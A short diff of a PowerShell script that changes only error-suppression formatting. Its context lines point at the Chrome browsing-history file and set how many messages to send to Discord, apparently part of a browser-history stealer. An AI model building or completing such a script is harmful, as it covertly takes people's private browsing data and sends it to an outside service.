@@ -5,7 +5,8 @@
 ### -JW
 ################
 
-$ErrorActionPreference= 'silentlycontinue'
+
+$ErrorActionPreference = 'SilentlyContinue'
 $filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
 $maxMsgs = "30" # Maximum number of messages to send to Discord
 
